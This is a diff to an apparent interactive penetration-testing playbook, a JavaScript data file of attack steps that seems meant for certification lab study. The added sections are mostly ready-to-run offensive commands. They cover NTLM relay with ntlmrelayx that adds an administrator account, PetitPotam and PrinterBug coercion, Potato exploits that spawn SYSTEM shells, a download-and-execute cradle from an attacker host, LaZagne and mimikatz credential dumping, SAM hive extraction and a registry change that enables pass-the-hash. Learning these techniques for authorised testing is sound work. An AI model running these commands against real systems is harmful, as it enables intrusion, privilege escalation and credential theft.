@@ -55,7 +55,7 @@ cd ~/results/$ip`,
       { label: "Windows persistence", next: "persistence" },
       { label: "LOLBins — Windows built-in abuse", next: "lolbins" },
       { label: "Password attacks hub", next: "password_attacks" },
-      { label: "HTTP password brute force", next: "http_brute" },
+      { label: "HTTP password brute force", next: "bruteforce" },
       { label: "Scan notes — document findings", next: "scan_notes" },
       { label: "Version # danger reference", next: "version_ref" },
       { label: "Pivoting & tunnels", next: "jump_pivot" },
@@ -188,7 +188,7 @@ searchsploit -x <path/to/exploit>`,
       { label: "WordPress", next: "wordpress" },
       { label: "SSTI — template injection", next: "ssti" },
       { label: "Login page — brute / bypass", next: "login_page" },
-      { label: "HTTP password brute force", next: "http_brute" },
+      { label: "HTTP password brute force", next: "bruteforce" },
       { label: "Subdomain enumeration", next: "subdomain_enum" },
       { label: "Back to jump menu", next: "jump_menu" },
     ],
@@ -266,12 +266,14 @@ searchsploit -x <path/to/exploit>`,
       { label: "Token impersonation (Potato attacks)", next: "token_privs" },
       { label: "Unquoted service path", next: "unquoted_service" },
       { label: "Weak service permissions", next: "weak_service" },
+      { label: "Compile Windows payloads (mingw/msfvenom)", next: "win_compile" },
       { label: "AlwaysInstallElevated", next: "always_install_elevated" },
+      { label: "Scheduled Tasks privesc", next: "scheduled_tasks_win" },
       { label: "Credential hunting (registry/files/SAM)", next: "windows_creds" },
       { label: "Pass the Hash", next: "pth" },
       { label: "DPAPI credential extraction", next: "dpapi" },
-      { label: "Manual enum (tasks/DLL/UAC)", next: "windows_manual_enum" },
-      { label: "Scheduled task exploitation", next: "win_schtask" },
+      { label: "Manual enum (tasks/DLL/UAC)", next: "windows_post_exploit" },
+      { label: "Scheduled task exploitation", next: "scheduled_tasks_win" },
       { label: "DLL hijacking", next: "win_dll_hijack" },
       { label: "UAC bypass", next: "win_uac_bypass" },
       { label: "AMSI / AV bypass", next: "amsi_bypass" },
@@ -3223,7 +3225,7 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt \\
     choices: [
       { label: "Got access", next: "file_upload" },
       { label: "SQLi bypass worked", next: "sqli_test" },
-      { label: "Brute force the login", next: "http_brute" },
+      { label: "Brute force the login", next: "bruteforce" },
       { label: "Need usernames first", next: "web_fuzz_deep" },
     ],
   },
@@ -4187,34 +4189,67 @@ msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=$lport EXITFUNC=thread 
     phase: "SMB",
     title: "SMB Enumeration",
     body: "SMB is information-rich. Null session, guest access, share contents, user enumeration. EternalBlue check is mandatory.",
-    cmd: `# Full enum
+    cmd: `# ── BASIC ENUM ────────────────────────────────────────
 enum4linux-ng -A $ip | tee scans/smb_enum.txt
+nmap -p 445 -sV $ip
 
-# CME — null + guest
+# ── NULL / GUEST SESSION ──────────────────────────────
 crackmapexec smb $ip -u '' -p '' --shares
 crackmapexec smb $ip -u 'guest' -p '' --shares
 crackmapexec smb $ip -u '' -p '' --users
+crackmapexec smb $ip -u '' -p '' --groups
+crackmapexec smb $ip -u '' -p '' --pass-pol
 
 # List + browse shares
 smbclient -L //$ip -N
 smbclient //$ip/share -N
 
-# Vuln check
-# Full SMB NSE — enum + vuln
+# ── SMB SIGNING CHECK (relay attack prerequisite) ─────
+crackmapexec smb $ip --gen-relay-list relay_targets.txt
+nmap -p 445 --script smb2-security-mode $ip
+# If "Message signing enabled but not required" = relay possible
+
+# ── NTLM RELAY ATTACK ─────────────────────────────────
+# Step 1: check signing disabled
+# Step 2: on Kali — start responder (disable SMB/HTTP)
+# Edit /etc/responder/Responder.conf: SMB=Off, HTTP=Off
+sudo responder -I tun0 -rdw
+# Step 3: ntlmrelayx — relay to target
+impacket-ntlmrelayx -tf relay_targets.txt -smb2support
+# With command execution:
+impacket-ntlmrelayx -tf relay_targets.txt -smb2support -c "net user hacker pass123! /add && net localgroup administrators hacker /add"
+# Step 4: trigger auth — wait or coerce via printerbug/petitpotam
+
+# ── NET-NTLMv2 CAPTURE (Responder) ───────────────────
+# Start responder to capture hashes
+sudo responder -I tun0 -rdwv
+# Hashes saved to /usr/share/responder/logs/
+# Crack captured hash:
+hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+
+# ── VULN SCAN ─────────────────────────────────────────
+nmap -p 445 --script smb-vuln-ms17-010 $ip
+nmap -p 445 --script smb-vuln-ms08-067 --script-args=unsafe=1 $ip
 nmap -Pn -sV -p 445 \\
   "--script=banner,(nbstat or smb* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" \\
   --script-args=unsafe=1 -oN scans/nse_smb.txt $ip
 
-# Targeted vuln checks
-nmap -p 445 --script smb-vuln-ms17-010 $ip
-nmap -p 445 --script smb-vuln-ms08-067 --script-args=unsafe=1 $ip
-nmap -p 445 --script smb-vuln-ms06-025 --script-args=unsafe=1 $ip`,
+# ── WITH CREDS ────────────────────────────────────────
+crackmapexec smb $ip -u user -p 'password' --shares
+crackmapexec smb $ip -u user -p 'password' --users
+crackmapexec smb $ip -u user -p 'password' --sam
+crackmapexec smb $ip -u user -p 'password' --lsa
+crackmapexec smb $ip -u user -p 'password' -x "whoami"
+crackmapexec smb $ip -u user -p 'password' -X "Get-LocalUser"`,
     warn: null,
     choices: [
       { label: "MS17-010 / EternalBlue vulnerable", next: "eternalblue" },
+      { label: "Signing disabled — NTLM relay", next: "smb_relay" },
+      { label: "Captured Net-NTLMv2 — crack it", next: "hashcrack" },
       { label: "Readable shares — download everything", next: "smb_loot" },
+      { label: "Got creds — PTH or spray", next: "pth" },
       { label: "Got usernames — brute force", next: "bruteforce" },
-      { label: "Need creds to go further", next: "bruteforce" },
     ],
   },
 
@@ -4244,6 +4279,55 @@ python3 eternalblue_exploit7.py $ip shellcode/sc_x86.bin`,
     choices: [
       { label: "Got SYSTEM shell!", next: "windows_post_exploit" },
       { label: "Exploit unstable — try manual MS17-010 PoC", next: "searchsploit_web" },
+    ],
+  },
+
+  smb_relay: {
+    phase: "SMB",
+    title: "NTLM Relay Attack",
+    body: "SMB signing disabled = relay NTLMv2 hashes to other machines instead of cracking them. Requires at least two targets. ntlmrelayx does the heavy lifting.",
+    cmd: `# ── PREREQUISITES ────────────────────────────────────
+# 1. SMB signing disabled on target (not required)
+crackmapexec smb $ip/24 --gen-relay-list relay_targets.txt
+cat relay_targets.txt
+
+# ── STEP 1: CONFIGURE RESPONDER ──────────────────────
+# Turn OFF SMB and HTTP in responder (we relay, not capture)
+sudo nano /etc/responder/Responder.conf
+# Set: SMB = Off, HTTP = Off
+sudo responder -I tun0 -rdwv
+
+# ── STEP 2: START NTLMRELAYX ─────────────────────────
+# Basic relay — dumps SAM if admin
+impacket-ntlmrelayx -tf relay_targets.txt -smb2support
+
+# With command execution (add admin user)
+impacket-ntlmrelayx -tf relay_targets.txt -smb2support -c "net user hacker pass123! /add"
+impacket-ntlmrelayx -tf relay_targets.txt -smb2support -c "net localgroup administrators hacker /add"
+
+# Interactive shell mode
+impacket-ntlmrelayx -tf relay_targets.txt -smb2support -i
+# Then: nc 127.0.0.1 <port shown>
+
+# Relay to LDAP (for AD attacks)
+impacket-ntlmrelayx -t ldap://dc01 -smb2support --no-dump
+
+# ── STEP 3: TRIGGER AUTHENTICATION ───────────────────
+# Wait for user to connect to a UNC path
+# Or coerce via:
+# PrinterBug:
+impacket-printerbug domain/user:pass@$ip $LHOST
+# PetitPotam (no creds needed):
+python3 PetitPotam.py $LHOST $ip
+
+# ── STEP 4: CHECK RESULTS ────────────────────────────
+# ntlmrelayx dumps SAM hashes if relay successful
+# Use dumped hashes for PTH`,
+    warn: "Both machines must have SMB signing disabled/not required. Cannot relay to the same machine the hash came from.",
+    choices: [
+      { label: "Got SAM hashes — PTH", next: "pth" },
+      { label: "Command executed — got shell", next: "windows_post_exploit" },
+      { label: "Relay failed — crack hash instead", next: "hashcrack" },
     ],
   },
 
@@ -4456,7 +4540,7 @@ python3 -c "print(62**8 / 9276300000)"  # seconds on RTX 3090 SHA256
     choices: [
       { label: "Online — brute force live service", next: "bruteforce" },
       { label: "Offline — crack a hash", next: "hashcrack" },
-      { label: "Build better wordlist / rules", next: "wordlist_build" },
+      { label: "Build better wordlist / rules", next: "custom_wordlist" },
       { label: "Back to jump menu", next: "jump_menu" },
     ],
   },
@@ -4612,7 +4696,7 @@ john hash.txt --show`,
     warn: "rockyou-30000.rule was built specifically for use with rockyou.txt — use it together. bcrypt and sha512crypt are intentionally slow — GPU gives minimal advantage. For those, a targeted wordlist + rules beats a massive wordlist every time.",
     choices: [
       { label: "Cracked — got plaintext", next: "creds_found" },
-      { label: "rockyou failed — build better wordlist", next: "wordlist_build" },
+      { label: "rockyou failed — build better wordlist", next: "custom_wordlist" },
       { label: "Back to password attacks hub", next: "password_attacks" },
     ],
   },
@@ -4634,7 +4718,35 @@ mysql -u user -p'password' -h $ip
 # Check all share access with creds
 crackmapexec smb $ip -u user -p 'password' --shares
 crackmapexec smb $ip -u user -p 'password' --users
-crackmapexec smb $ip -u user -p 'password' --groups`,
+crackmapexec smb $ip -u user -p 'password' --groups
+
+# ── RUNAS — open PS as another user (Windows, requires GUI) ──
+# Basic runas — opens cmd window as target user
+runas /user:HOSTNAME\targetuser cmd
+
+# Open PowerShell as target user
+runas /user:HOSTNAME\targetuser powershell
+
+# With saved credentials (if cmdkey has them stored)
+runas /savecred /user:HOSTNAME\targetuser powershell
+
+# Domain user
+runas /user:DOMAIN\targetuser powershell
+
+# No GUI? Use PowerShell credential object instead:
+# (works in bind shell / WinRM)
+# pw = ConvertTo-SecureString "FOUND_PASSWORD" -AsPlainText -Force
+# cred = New-Object PSCredential("HOSTNAME/targetuser", pw)
+# Start-Process powershell -Credential cred
+
+# Then in the new window — verify you are the new user:
+whoami
+whoami /groups
+whoami /priv
+
+# Re-enumerate as new user — permissions change!
+# Run full enum again — files readable by dave may not be
+# readable by steve and vice versa (Module 17.1.3 pattern)`,
     warn: null,
     choices: [
       { label: "SSH / shell access — Linux machine", next: "linux_post_exploit" },
@@ -5111,6 +5223,92 @@ hostname
 # ── STEP 2: INTEGRITY LEVEL AND UAC ──────────────────
 # Medium = UAC active, High = already elevated
 whoami /groups | findstr "Mandatory Label"
+whoami /groups | findstr /i "integrity"
+
+# Integrity levels:
+# Low    = sandboxed (browser, AppContainer)
+# Medium = default authenticated user
+# High   = UAC-elevated admin process
+# System = NT AUTHORITY\SYSTEM
+
+# Split token — local admins get two tokens at logon:
+# Token 1 = Standard (medium) used for normal work
+# Token 2 = Elevated (high) activated only with UAC consent
+# UAC bypass = get high token without showing consent prompt
+
+# UAC prompt types:
+# Consent Prompt    = in Admins group, just click Yes
+# Credential Prompt = not in Admins, must enter admin creds
+# Bypass target     = Consent Prompt scenario
+
+# Horizontal vs Vertical privesc:
+# Horizontal = same priv level, different user (dave -> steve)
+# Vertical   = lower to higher privilege (user -> admin -> SYSTEM)
+
+# SID quick reference: S-R-X-Y
+# S-1-0-0  = Null SID
+# S-1-1-0  = Everyone
+# S-1-5-11 = Authenticated Users
+# S-1-5-18 = Local System (SYSTEM)
+# S-1-5-domain-500 = Administrator
+
+# ── STEP 2B: HACKTRICKS CHECKLIST EXTRAS ─────────────
+# ref: hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html
+
+# Clipboard — someone may have copied a password
+Get-Clipboard
+
+# Active logged-on sessions — other users connected right now
+query session
+qwinsta
+
+# Password policy — check before brute forcing
+net accounts
+
+# WDigest — if enabled, plaintext creds in LSASS memory
+reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
+# If value = 1 = plaintext creds in memory = run mimikatz sekurlsa::logonpasswords
+
+# AppLocker policy — know what you can/cant run
+Get-AppLockerPolicy -Effective -xml
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+
+# AV check
+WMIC /Node:localhost /Namespace:\root\SecurityCenter2 Path AntiVirusProduct Get displayName
+Get-MpComputerStatus | select AMRunningMode,RealTimeProtectionEnabled
+
+# WSUS — check if exploitable (non-SSL WSUS = MiTM possible)
+reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer
+# If value = 1 = exploitable with WSUSpicious/pyWSUS
+
+# Hidden local services — look for internal services not exposed
+netstat -ano | findstr "127.0.0.1"
+
+# Saved RDP connections
+reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers"
+
+# Winlogon autologon creds
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
+
+# AppCmd.exe — IIS credential disclosure
+# If exists: C:\Windows\System32\inetsrv\appcmd.exe
+# appcmd.exe list apppool /processModel.password /xml
+
+# SSH keys in registry (sometimes stored here)
+reg query HKCU\Software\OpenSSH\Agent\Keys
+
+# ── SID QUICK REFERENCE ──────────────────────────────
+# SID format: S-R-X-Y  (S=SID, R=revision, X=authority, Y=sub-authority+RID)
+# RID starts at 1000 for standard users
+# Well-known SIDs:
+# S-1-0-0  = Null SID (no members)
+# S-1-1-0  = Everyone
+# S-1-5-11 = Authenticated Users
+# S-1-5-18 = Local System (NT AUTHORITY\SYSTEM)
+# S-1-5-domainidentifier-500 = Administrator
+# S-1-5-domainidentifier-512 = Domain Admins
 
 # ── STEP 3: USERS AND GROUPS ──────────────────────────
 net user
@@ -5137,16 +5335,36 @@ Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall
 Get-ChildItem "C:\\Program Files", "C:\\Program Files (x86)" | select Name
 
 # ── STEP 7: RUNNING PROCESSES ─────────────────────────
+# Basic list
 Get-Process
-# Cross-ref PIDs with netstat
 
-# Get full binary path — spot non-standard processes
+# Cross-ref PIDs with netstat
+netstat -ano
+
+# Full binary path — spot non-standard processes
 Get-Process | Sort-Object ProcessName | Select Id,ProcessName,Path
-# Filter out standard Windows paths
-Get-Process | Select Id,ProcessName,Path | Where Path -notlike "*Windows*" | Where Path -notlike "*Program Files*"
-# Get path of a specific process
-Get-Process -Name NonStandardProcess | Select -Expand Path
-# Then check that directory for flags/creds
+
+# Filter out standard Windows paths (NonStandardProcess lab pattern)
+Get-Process | Select Id,ProcessName,Path | Where-Object Path -notlike "*Windows*" | Where-Object Path -notlike "*Program Files*"
+
+# Which user is running a process?
+Get-CimInstance Win32_Process | Select Name,ProcessId,@{N="Owner";E={$_.GetOwner().User}} | Sort Name
+
+# Filter for specific service/process owner:
+Get-CimInstance Win32_Service -Filter "Name='mysql'" | Select Name,State,StartName,ProcessId,PathName
+
+# WMIC process with owner info:
+wmic process list full
+wmic process where "name='mysqld.exe'" get name,processid,executablepath
+
+# Get path of specific process
+Get-Process -Name mysqld | Select -Expand Path
+
+# sc.exe — service config and extended info
+sc.exe qc <ServiceName>
+sc.exe queryex <ServiceName>
+
+# Then check that directory for flags/creds/writable perms
 
 # ── STEP 8: SCHEDULED TASKS ───────────────────────────
 schtasks /query /fo LIST /v
@@ -5162,6 +5380,28 @@ wmic service get name,pathname
 (Get-PSReadlineOption).HistorySavePath
 type C:\\Users\\$env:USERNAME\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt
 Get-History
+# ── NET USER — enumerate specific user ──────────────
+net user <username>
+# Shows groups, last logon, password policy, etc
+
+# ── WRITE ACCESS TEST ────────────────────────────────
+# Test if you can write to a directory before attempting hijack
+echo "" > C:\\Services\\test.txt
+echo "" > "C:\\Program Files\\EnterpriseApp\\test.txt"
+# If no error = writable
+
+# Check all users history
+Get-ChildItem C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt -ErrorAction SilentlyContinue | Get-Content
+
+# ── EVENT VIEWER — SCRIPT BLOCK LOGS (Event ID 4104) ─
+# GUI method — THIS IS THE RELIABLE WAY (Module 17.1.2)
+# 1. Event Viewer -> Apps and Services Logs -> Microsoft -> Windows -> PowerShell -> Operational
+# 2. Right-click -> Filter Current Log -> Event ID: 4104
+# 3. Scroll through Warning-level events manually
+# 4. Ctrl+F to Find: password, net user, admin, secret, runas
+# 5. Passwords typed in plain text in PS commands show here
+# 6. Check the User field — you can read commands run by OTHER users
+# Note: PS CLI queries for this often fail — use Event Viewer GUI
 
 # ── STEP 11: POWERSHELL TRANSCRIPTS ──────────────────
 # Transcript files = over-the-shoulder recording of PS sessions
@@ -5217,12 +5457,15 @@ Get-ChildItem -Path C:\\Users -Include local.txt,proof.txt -Recurse -ErrorAction
     warn: "PSReadline history survives Clear-History — always check it. Transcript files often contain PSCredential creation commands with plaintext passwords. Re-enumerate fully after gaining each new user account — permissions change and you unlock new files.",
     choices: [
       { label: "SeImpersonatePrivilege in whoami /priv", next: "token_privs" },
-      { label: "Second NIC in ipconfig — pivot opportunity", next: "pivot_start" },
+      { label: "In Admins but medium integrity — UAC bypass", next: "win_uac_bypass" },
       { label: "Run WinPEAS automated enum", next: "winpeas" },
-      { label: "Found KeePass / password manager", next: "hashcrack" },
-      { label: "Found creds in history/registry/files", next: "creds_found" },
-      { label: "Check service-based privesc vectors", next: "unquoted_service" },
+      { label: "Credential hunting (files/PS history/XAMPP)", next: "windows_creds" },
+      { label: "Found creds — spray everything", next: "creds_found" },
+      { label: "Weak service binary / unquoted path / DLL", next: "unquoted_service" },
+      { label: "Scheduled task with writable binary", next: "scheduled_tasks_win" },
       { label: "AlwaysInstallElevated both keys = 1", next: "always_install_elevated" },
+      { label: "Kernel exploit — missing patches", next: "win_kernel_exploit" },
+      { label: "Second NIC in ipconfig — pivot opportunity", next: "pivot_start" },
       { label: "PowerShell blocked — AMSI bypass first", next: "amsi_bypass" },
     ],
   },
@@ -5272,8 +5515,43 @@ powershell -ep bypass -c ". .\\pc.ps1; Invoke-PrivescCheck"
 powershell -ep bypass -c ". .\\pc.ps1; Invoke-PrivescCheck -Extended"
 
 # ── SEATBELT ─────────────────────────────────────────
-.\\Seatbelt.exe -group=all
-.\\Seatbelt.exe -group=system -outputfile C:\\Windows\\Temp\\seatbelt.txt
+# Download precompiled (r3motecontrol repo is most reliable):
+# On Kali:
+# wget "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe"
+# python3 -m http.server 80
+# On Windows:
+iwr http://$LHOST/Seatbelt.exe -OutFile C:\\Windows\\Temp\\sb.exe
+Unblock-File C:\\Windows\\Temp\\sb.exe
+C:\\Windows\\Temp\\sb.exe -group=all
+C:\\Windows\\Temp\\sb.exe InstalledProducts
+C:\\Windows\\Temp\\sb.exe -group=system -outputfile C:\\Windows\\Temp\\seatbelt.txt
+
+# ── JAWS ──────────────────────────────────────────────
+# Download:
+# wget "https://github.com/411Hall/JAWS/raw/master/jaws-enum.ps1"
+iwr http://$LHOST/jaws-enum.ps1 -OutFile C:\\Windows\\Temp\\jaws.ps1
+powershell -ep bypass -c ". C:\\Windows\\Temp\\jaws.ps1" | Tee-Object -FilePath C:\\Windows\\Temp\\jaws.txt
+
+# ── LAZAGNE — credential dumper ────────────────────────
+# Dumps creds from browsers, git, wifi, windows vault etc
+# wget https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe
+iwr http://$LHOST/LaZagne.exe -OutFile C:\\Windows\\Temp\\lz.exe
+Unblock-File C:\\Windows\\Temp\\lz.exe
+.\\lz.exe all > C:\\Windows\\Temp\\lazagne.txt
+type C:\\Windows\\Temp\\lazagne.txt
+
+# ── PRIVESCCHECK EXTENDED (HackTrack method) ───────────
+# In-memory — no file drop needed:
+(new-object net.webclient).downloadstring("http://$LHOST/PrivescCheck.ps1") | iex
+Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML,CSV,XML
+
+# ── LOCALACCOUNTTOKENFILTERPOLICY ──────────────────────
+# Controls UAC remote token filtering for local admins
+# 0 (default) = local admins treated as standard users over SMB/WinRM
+# 1 = local admins get full admin token remotely (needed for PTH)
+reg query "HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System" /v LocalAccountTokenFilterPolicy
+# Set to 1 to enable full remote admin (requires admin):
+reg add "HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
 
 # ── WES-NG (kernel exploits from systeminfo) ─────────
 systeminfo > C:\\Windows\\Temp\\sysinfo.txt
@@ -5298,23 +5576,94 @@ systeminfo > C:\\Windows\\Temp\\sysinfo.txt
     cmd: `whoami /priv
 # Look for: SeImpersonatePrivilege
 #           SeAssignPrimaryTokenPrivilege
+# IMPORTANT: Disabled != not present
+# Disabled means the privilege EXISTS but isnt currently active
+# Tools like Potato/SigmaPotato will activate and use it automatically
+# AdjustTokenPrivileges can enable Disabled privs — cannot ADD new ones
 
-# PrintSpoofer — Windows 10 / Server 2016-2019
-iwr http://$LHOST/PrintSpoofer64.exe -OutFile C:\\Windows\\Temp\\ps.exe
-.\\ps.exe -i -c cmd
-.\\ps.exe -c "C:\\Windows\\Temp\\shell.exe"
+# ── CHECK ALL DANGEROUS PRIVILEGES ──────────────────
+whoami /priv
+# High value targets:
+# SeImpersonatePrivilege    -> Potato attacks -> SYSTEM
+# SeAssignPrimaryToken      -> Potato attacks -> SYSTEM
+# SeBackupPrivilege         -> read any file including SAM/SYSTEM
+# SeRestorePrivilege        -> write any file -> plant DLL/replace binary
+# SeTakeOwnershipPrivilege  -> take ownership of any object
+# SeDebugPrivilege          -> inject into SYSTEM processes -> SYSTEM
+# SeLoadDriverPrivilege     -> load malicious kernel driver
+# SeShutdownPrivilege       -> reboot (useful for service binary hijack)
 
-# RoguePotato — Win10 1809+ / Server 2019+
-# On Kali first: socat tcp-listen:135,reuseaddr,fork tcp:$LHOST:9999
-RoguePotato.exe -r $LHOST -e "cmd.exe" -l 9999
+# ── SeBackupPrivilege — read SAM/SYSTEM ──────────────
+# Cannot read via normal copy — use robocopy or reg save
+reg save HKLM\\SAM C:\\Windows\\Temp\\sam
+reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system
+reg save HKLM\\SECURITY C:\\Windows\\Temp\\security
+# Transfer to Kali and dump:
+impacket-secretsdump -sam sam -system system -security security local
 
-# GodPotato — most universal (works on Server 2012-2022)
+# ── SeRestorePrivilege — write anywhere ──────────────
+# Plant DLL in System32, replace service binary etc
+# Use with win_dll_hijack or weak_service workflow
+
+# ── SeTakeOwnershipPrivilege ─────────────────────────
+# Take ownership of SAM, then read it
+takeown /f C:\\Windows\\System32\\config\\SAM
+icacls C:\\Windows\\System32\\config\\SAM /grant administrators:F
+
+# ── SeDebugPrivilege — inject into SYSTEM process ────
+# mimikatz
+privilege::debug
+token::elevate
+sekurlsa::logonpasswords
+
+# ── DOWNLOAD LINKS (on Kali) ─────────────────────────
+# SigmaPotato (Module 17.3.2 — most recent, recommended)
+# wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe
+
+# GodPotato (most universal — Server 2012-2022, Win10-11)
+# wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe
+
+# PrintSpoofer (Win10 / Server 2016-2019)
+# wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
+
+# JuicyPotatoNG
+# wget https://github.com/antonioCoco/JuicyPotatoNG/releases/download/v1.1/JuicyPotatoNG.zip
+
+# RoguePotato
+# wget https://github.com/antonioCoco/RoguePotato/releases/download/1.0/RoguePotato.zip
+
+# ── SIGMAPOTATO (Module 17.3.2) ──────────────────────
+iwr http://$LHOST/SigmaPotato.exe -OutFile C:\\Windows\\Temp\\sp.exe
+Unblock-File C:\\Windows\\Temp\\sp.exe
+.\\sp.exe "net user hacker pass123! /add"
+.\\sp.exe "net localgroup Administrators hacker /add"
+# Or reverse shell:
+.\\sp.exe "C:\\Windows\\Temp\\shell.exe"
+
+# ── GODPOTATO (most universal) ───────────────────────
 iwr http://$LHOST/GodPotato-NET4.exe -OutFile C:\\Windows\\Temp\\gp.exe
+Unblock-File C:\\Windows\\Temp\\gp.exe
 .\\gp.exe -cmd "cmd /c whoami"
+.\\gp.exe -cmd "net user hacker pass123! /add"
 .\\gp.exe -cmd "C:\\Windows\\Temp\\shell.exe"
 
-# JuicyPotatoNG — if others fail
-.\\JuicyPotatoNG.exe -t * -p "C:\\Windows\\System32\\cmd.exe" -a "/c whoami"`,
+# ── PRINTSPOOFER (Win10 / Server 2016-2019) ──────────
+iwr http://$LHOST/PrintSpoofer64.exe -OutFile C:\\Windows\\Temp\\pf.exe
+Unblock-File C:\\Windows\\Temp\\pf.exe
+.\\pf.exe -i -c cmd
+.\\pf.exe -c "C:\\Windows\\Temp\\shell.exe"
+
+# ── ROGUEPOTATO (Win10 1809+ / Server 2019+) ─────────
+# On Kali first:
+# socat tcp-listen:135,reuseaddr,fork tcp:$LHOST:9999
+iwr http://$LHOST/RoguePotato.exe -OutFile C:\\Windows\\Temp\\rp.exe
+Unblock-File C:\\Windows\\Temp\\rp.exe
+.\\rp.exe -r $LHOST -e "cmd.exe" -l 9999
+
+# ── JUICYPOTATONG (fallback) ─────────────────────────
+iwr http://$LHOST/JuicyPotatoNG.exe -OutFile C:\\Windows\\Temp\\jp.exe
+Unblock-File C:\\Windows\\Temp\\jp.exe
+.\\jp.exe -t * -p "C:\\Windows\\System32\\cmd.exe" -a "/c whoami"`,
     warn: null,
     choices: [
       { label: "Potato worked — SYSTEM!", next: "got_root_windows" },
@@ -5352,318 +5701,578 @@ sc start <ServiceName>`,
       { label: "Can't write to that path", next: "weak_service" },
     ],
   },
-
-  weak_service: {
+  windows_creds: {
     phase: "WINDOWS",
-    title: "Weak Service Permissions",
-    body: "If you have WRITE_DAC or SERVICE_CHANGE_CONFIG on a service, you can redirect its binary path to your payload.",
-    cmd: `# Find weak service perms
-.\\accesschk.exe -uwcqv "Authenticated Users" * /accepteula
-.\\accesschk.exe -uwcqv "Everyone" * /accepteula
-.\\accesschk.exe -uwcqv "$USER" * /accepteula
+    title: "Windows Credential Hunting",
+    body: "Hidden in Plain View (Module 17.1.3): users store passwords in config files, meeting notes, PS history. Always re-enumerate after gaining a new user — permissions change what you can read.",
+    cmd: `# ── KEEPASS DATABASE ─────────────────────────────────
+Get-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
 
-# Modify binary path
-sc config <ServiceName> binpath= "C:\\Windows\\Temp\\shell.exe"
-sc config <ServiceName> binpath= "net localgroup administrators user /add"
+# ── XAMPP / WEB SERVER CONFIGS ───────────────────────
+Get-ChildItem -Path C:\\\\xampp -Include *.txt,*.ini,*.conf,*.php,*.config -File -Recurse -ErrorAction SilentlyContinue
+type C:\\\\xampp\\\\passwords.txt
+type C:\\\\xampp\\\\mysql\\\\bin\\\\my.ini
+# my.ini often has plaintext MySQL password + Windows password comment
 
-sc stop <ServiceName>
-sc start <ServiceName>
+# ── USER HOME DIRS ───────────────────────────────────
+# Module 17.1.3 pattern — dave found creds in asdf.txt on desktop
+Get-ChildItem -Path C:\\\\Users\\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini,*.config,*.ps1,*.bat,*.log,*.bak -File -Recurse -ErrorAction SilentlyContinue
 
-# Check service recovery options too
-sc qfailure <ServiceName>`,
+# ── BROAD SEARCH ─────────────────────────────────────
+Get-ChildItem -Path C:\\ -Include *pass*,*cred*,*secret*,*vnc*,*.kdbx,*config*,*unattend* -File -Recurse -ErrorAction SilentlyContinue
+
+# cmd style
+dir /s /b C:\\\\Users\\\\*.xml
+dir /s /b C:\\\\Users\\\\*.txt
+dir /s /b C:\\*pass*
+
+# ── PSREADLINE HISTORY ───────────────────────────────
+(Get-PSReadlineOption).HistorySavePath
+type C:\\\\Users\\\\dave\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\PowerShell\\\\PSReadLine\\\\ConsoleHost_history.txt
+# Check ALL users
+Get-ChildItem C:\\\\Users\\\\*\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\PowerShell\\\\PSReadLine\\\\ConsoleHost_history.txt -ErrorAction SilentlyContinue | Get-Content
+
+# ── POWERSHELL TRANSCRIPTS ───────────────────────────
+# Often contain PSCredential creation with plaintext passwords
+Get-ChildItem -Path C:\\\\Users -Include *transcript* -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem C:\\\\Transcripts\\ -ErrorAction SilentlyContinue
+type C:\\\\Users\\\\Public\\\\Transcripts\\\\transcript01.txt
+
+# ── EVENT VIEWER — SCRIPT BLOCK LOGS (4104) ─────────
+# GUI: Event Viewer -> Apps & Services -> Microsoft -> Windows -> PowerShell -> Operational
+# Filter Current Log -> Event ID: 4104
+# Ctrl+F: password, net user, admin, secret
+# Warning-level events = suspicious — read each one
+# NOTE: GUI method more reliable than CLI for this
+
+# ── SAM / REGISTRY CREDS ─────────────────────────────
+# Winlogon autologon
+reg query "HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon" /v DefaultPassword
+reg query "HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon" /v DefaultUserName
+
+# Credential Manager
+cmdkey /list
+
+# Wifi passwords
+netsh wlan show profile
+netsh wlan show profile "SSID" key=clear
+
